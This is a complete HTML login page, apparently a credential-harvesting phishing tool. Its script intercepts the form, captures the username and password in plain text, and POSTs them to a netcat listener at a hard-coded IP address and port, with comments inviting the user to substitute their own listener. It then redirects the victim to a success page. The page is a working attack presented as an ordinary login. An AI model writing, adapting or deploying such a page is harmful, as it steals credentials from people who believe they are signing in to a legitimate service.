<!DOCTYPE html>
<html>
<head>
  <title>Login</title>
  <style>
    /* Add your custom CSS styles here */
  </style>
</head>
<body>
  <h2>Login</h2>
  <form id="loginForm">
    <label for="username">Username:</label>
    <input type="text" id="username" name="username" required><br>

    <label for="password">Password:</label>
    <input type="password" id="password" name="password" required><br>

    <input type="submit" value="Login">
  </form>

  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault(); // Prevent the form from being submitted

      // Retrieve the form inputs
      var username = document.getElementById('username').value;
      var password = document.getElementById('password').value;

      // Netcat listener configuration
      var ncHost = '192.168.10.175';  // Replace with your netcat listener's IP address
      var ncPort = 8080;               // Replace with your netcat listener's port

      // Create a new XMLHttpRequest object
      var xhr = new XMLHttpRequest();

      // Prepare the data to send
      var data = "Username: " + username + "\nPassword: " + password + "\n";

      // Configure the request
      xhr.open('POST', 'http://' + ncHost + ':' + ncPort, true);

      // Set the appropriate headers
      xhr.setRequestHeader('Content-Type', 'text/plain');

      // Send the login information to the netcat listener
      xhr.send(data);

      // Redirect to a success page or display a success message
      window.location.href = 'success.html';
    });
  </script>
</body>
</html>
